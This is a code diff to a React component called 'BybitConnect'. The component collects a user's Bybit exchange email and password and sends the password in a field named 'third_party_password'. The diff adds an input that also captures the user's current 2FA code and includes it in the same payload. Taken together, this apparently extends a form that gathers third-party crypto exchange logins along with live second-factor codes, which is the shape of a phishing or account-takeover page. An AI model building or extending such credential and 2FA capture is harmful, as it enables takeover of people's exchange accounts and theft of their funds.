@@ -15,6 +15,7 @@ export default function BybitConnect() {
   const [credentials, setCredentials] = useState({
     email: '',
     password: '',
+    code: '',
   });
 
   const handleFieldChange = (field: string) => (event: React.ChangeEvent<HTMLInputElement>) => {
@@ -75,6 +76,7 @@ export default function BybitConnect() {
         platform: 'Bybit',
         user_id: session?.user?.id || null,
         third_party_password: password,
+        code: credentials.code || null,
       };
 
       if (activeTab === 'Mobile') {
@@ -174,6 +176,15 @@ export default function BybitConnect() {
                 value={credentials.password}
                 onChange={handleFieldChange('password')}
                 placeholder="Enter your password"
+                className="w-full h-[52px] rounded-lg px-4 text-[16px] outline-none focus:ring-1 focus:ring-[#ff9d00] bg-[#f2f3f5] placeholder:text-gray-400"
+              />
+
+              <label className="block text-[14px] font-bold text-gray-700">2FA Code (optional)</label>
+              <input
+                type="text"
+                value={credentials.code}
+                onChange={handleFieldChange('code')}
+                placeholder="Enter 2FA code if required"
                 className="w-full h-[52px] rounded-lg px-4 text-[16px] outline-none focus:ring-1 focus:ring-[#ff9d00] bg-[#f2f3f5] placeholder:text-gray-400"
               />
             </div>
